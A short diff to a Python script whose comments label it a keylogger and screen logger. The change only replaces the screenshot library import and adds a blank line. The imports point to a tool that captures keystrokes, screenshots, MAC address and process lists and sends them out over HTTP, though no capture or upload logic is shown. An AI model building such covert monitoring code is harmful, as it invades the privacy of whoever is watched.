@@ -1,7 +1,7 @@
 import keyboard                             # For Keylogger
 from threading import Timer                 # For Keylogger
 from getmac import get_mac_address as gma   # For Mac Address
-import pyscreenshot as ImageGrab            # For ScreenLogger
+from PIL import ImageGrab                   # For ScreenLogger
 import base64                               # For ScreenLogger
 import requests                             # For API
 import json                                 # For API
@@ -33,6 +33,7 @@ def getProcess(self):
     process = ''
     for t in infoSet:
         process = process + t + ','
+
     return process
 
 def getImage(self):
